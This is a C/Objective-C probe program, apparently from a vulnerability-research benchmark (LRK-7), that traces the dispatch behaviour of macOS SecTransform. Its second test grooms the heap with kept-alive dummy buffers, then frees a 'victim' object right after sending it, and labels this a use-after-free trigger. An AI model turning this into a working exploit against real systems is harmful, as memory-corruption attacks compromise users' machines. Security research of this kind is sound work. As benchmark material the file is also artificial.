/*
 * transform_analysis.m — SecTransform internal dispatch model analysis
 * benchmark-id: LRK-7
 *
 * Traces the dispatch path of SetAttribute to understand:
 * 1. Which queue the deferred block runs on
 * 2. Whether Execute synchronizes with the downstream queue
 * 3. Why victim blocks don't fire after Execute returns
 */
#include <Security/SecCustomTransform.h>
#include <Security/SecTransform.h>
#include <CoreFoundation/CoreFoundation.h>
#include <dispatch/dispatch.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

#pragma clang diagnostic ignored "-Wdeprecated-declarations"

static CFStringRef kSenderType = NULL;
static CFStringRef kRecvType = NULL;

/* Track which thread/queue runs each callback */
static volatile int g_sender_done = 0;
static volatile int g_recv_count = 0;
static volatile int g_values_sent = 0;

static SecTransformInstanceBlock
SenderCreate(CFStringRef name, SecTransformRef newTransform,
             SecTransformImplementationRef ref) {
    SecTransformInstanceBlock ib = ^{
        CFErrorRef err = NULL;

        SecTransformCustomSetAttribute(ref,
            kSecTransformInputAttributeName,
            kSecTransformMetaAttributeRequired,
            kCFBooleanFalse);

        err = SecTransformSetTransformAction(ref,
            kSecTransformActionStartingExecution, ^{

            fprintf(stderr, "[sender] thread=%p queue=%s\n",
                    (void *)pthread_self(),
                    dispatch_queue_get_label(DISPATCH_CURRENT_QUEUE_LABEL));

            /* Send 5 values and log each */
            for (int j = 0; j < 5; j++) {
                char buf[32];
                snprintf(buf, sizeof(buf), "VALUE_%d", j);
                CFDataRef val = CFDataCreate(kCFAllocatorDefault,
                    (const UInt8 *)buf, strlen(buf));
                fprintf(stderr, "[sender] sending value %d at %p\n", j, (void*)val);
                SecTransformCustomSetAttribute(ref,
                    kSecTransformOutputAttributeName,
                    kSecTransformMetaAttributeValue,
                    val);
                /* Keep alive — don't release */
                g_values_sent++;
            }

            /* Send NULL (end of stream) */
            fprintf(stderr, "[sender] sending NULL (EOS)\n");
            SecTransformCustomSetAttribute(ref,
                kSecTransformOutputAttributeName,
                kSecTransformMetaAttributeValue,
                NULL);

            g_sender_done = 1;
            fprintf(stderr, "[sender] callback returning\n");
            return (CFTypeRef)NULL;
        });

        return err;
    };
    return Block_copy(ib);
}

static SecTransformInstanceBlock
RecvCreate(CFStringRef name, SecTransformRef newTransform,
           SecTransformImplementationRef ref) {
    SecTransformInstanceBlock ib = ^{
        CFErrorRef err = NULL;

        err = SecTransformSetDataAction(ref,
            kSecTransformActionProcessData, ^(CFTypeRef d) {
            g_recv_count++;
            fprintf(stderr, "[recv] ProcessData #%d: %s, thread=%p queue=%s\n",
                    g_recv_count,
                    d ? "DATA" : "NULL(EOS)",
                    (void *)pthread_self(),
                    dispatch_queue_get_label(DISPATCH_CURRENT_QUEUE_LABEL));
            if (d) {
                fprintf(stderr, "[recv]   addr=%p typeID=%lu\n",
                        (const void *)d, (unsigned long)CFGetTypeID(d));
            }
            return d;
        });

        return err;
    };
    return Block_copy(ib);
}

int main(void) {
    CFErrorRef error = NULL;

    fprintf(stderr, "=== SecTransform dispatch model analysis (LRK-7) ===\n\n");
    fprintf(stderr, "[main] thread=%p\n", (void *)pthread_self());

    kSenderType = CFSTR("com.test.lrk7.sender");
    kRecvType = CFSTR("com.test.lrk7.recv");

    SecTransformRegister(kSenderType, &SenderCreate, &error);
    SecTransformRegister(kRecvType, &RecvCreate, &error);

    /* Test 1: sender → receiver (no digest) — does receiver get all values? */
    fprintf(stderr, "\n--- Test 1: sender → receiver ---\n");
    {
        SecTransformRef s = SecTransformCreate(kSenderType, &error);
        SecTransformRef r = SecTransformCreate(kRecvType, &error);
        SecGroupTransformRef g = SecTransformCreateGroupTransform();
        SecTransformConnectTransforms(s, kSecTransformOutputAttributeName,
            r, kSecTransformInputAttributeName, g, &error);

        g_sender_done = 0;
        g_recv_count = 0;
        g_values_sent = 0;

        fprintf(stderr, "[main] calling SecTransformExecute...\n");
        CFTypeRef result = SecTransformExecute(g, &error);
        fprintf(stderr, "[main] SecTransformExecute returned\n");
        fprintf(stderr, "[main] sender_done=%d values_sent=%d recv_count=%d\n",
                g_sender_done, g_values_sent, g_recv_count);

        if (error) {
            fprintf(stderr, "[main] error: ");
            CFShow(error);
            CFRelease(error); error = NULL;
        }

        /* Wait a bit for async processing */
        fprintf(stderr, "[main] waiting 2s for async blocks...\n");
        usleep(2000000);
        fprintf(stderr, "[main] after wait: recv_count=%d\n", g_recv_count);

        if (result) CFRelease(result);
        CFRelease(s); CFRelease(r); CFRelease(g);
    }

    /* Test 2: sender → receiver, but sender keeps values alive
     * and sends UAF victim LAST — does receiver see victim? */
    fprintf(stderr, "\n--- Test 2: sender → recv with kept-alive dummies + victim ---\n");
    {
        static CFDataRef kept[5];
        static volatile int test2_recv = 0;

        CFStringRef kS2 = CFSTR("com.test.lrk7.s2");
        CFStringRef kR2 = CFSTR("com.test.lrk7.r2");

        SecTransformRegister(kS2, ^(CFStringRef n, SecTransformRef t,
            SecTransformImplementationRef r) {
            return Block_copy(^{
                CFErrorRef e = NULL;
                SecTransformCustomSetAttribute(r, kSecTransformInputAttributeName,
                    kSecTransformMetaAttributeRequired, kCFBooleanFalse);
                e = SecTransformSetTransformAction(r,
                    kSecTransformActionStartingExecution, ^{

                    fprintf(stderr, "[s2] sending 5 kept-alive dummies...\n");
                    for (int j = 0; j < 5; j++) {
                        kept[j] = CFDataCreate(kCFAllocatorDefault,
                            (const UInt8 *)"DUMMY_200BYTES_PAD_____________________"
                            "________________________________________"
                            "________________________________________"
                            "________________________________________"
                            "________________________________________", 200);
                        SecTransformCustomSetAttribute(r,
                            kSecTransformOutputAttributeName,
                            kSecTransformMetaAttributeValue,
                            kept[j]);
                        /* NOT released — kept alive */
                    }

                    /* UAF victim */
                    const char vp[] = "VICTIM_DATA_HERE_1234";
                    CFDataRef victim = CFDataCreate(kCFAllocatorDefault,
                        (const UInt8 *)vp, sizeof(vp) - 1);
                    fprintf(stderr, "[s2] sending victim at %p\n", (void*)victim);
                    SecTransformCustomSetAttribute(r,
                        kSecTransformOutputAttributeName,
                        kSecTransformMetaAttributeValue,
                        victim);

                    /* Send NULL + release = UAF trigger */
                    SecTransformCustomSetAttribute(r,
                        kSecTransformOutputAttributeName,
                        kSecTransformMetaAttributeValue,
                        NULL);
                    CFRelease(victim);
                    fprintf(stderr, "[s2] victim freed at %p. Returning.\n", (void*)victim);
                    return (CFTypeRef)NULL;
                });
                return e;
            });
        }, &error);

        SecTransformRegister(kR2, ^(CFStringRef n, SecTransformRef t,
            SecTransformImplementationRef r) {
            return Block_copy(^{
                CFErrorRef e = NULL;
                e = SecTransformSetDataAction(r,
                    kSecTransformActionProcessData, ^(CFTypeRef d) {
                    test2_recv++;
                    fprintf(stderr, "[r2] ProcessData #%d: %s addr=%p\n",
                            test2_recv, d ? "DATA" : "NULL",
                            (const void *)d);
                    return d;
                });
                return e;
            });
        }, &error);

        SecTransformRef s = SecTransformCreate(kS2, &error);
        SecTransformRef r = SecTransformCreate(kR2, &error);
        SecGroupTransformRef g = SecTransformCreateGroupTransform();
        SecTransformConnectTransforms(s, kSecTransformOutputAttributeName,
            r, kSecTransformInputAttributeName, g, &error);

        test2_recv = 0;
        CFTypeRef result = SecTransformExecute(g, &error);
        fprintf(stderr, "[main] Execute returned. recv=%d\n", test2_recv);
        usleep(3000000);
        fprintf(stderr, "[main] after 3s: recv=%d\n", test2_recv);

        if (error) { CFShow(error); CFRelease(error); error = NULL; }
        if (result) CFRelease(result);
        CFRelease(s); CFRelease(r); CFRelease(g);
        for (int j = 0; j < 5; j++) if (kept[j]) CFRelease(kept[j]);
    }

    fprintf(stderr, "\n=== DONE ===\n");
    return 0;
}
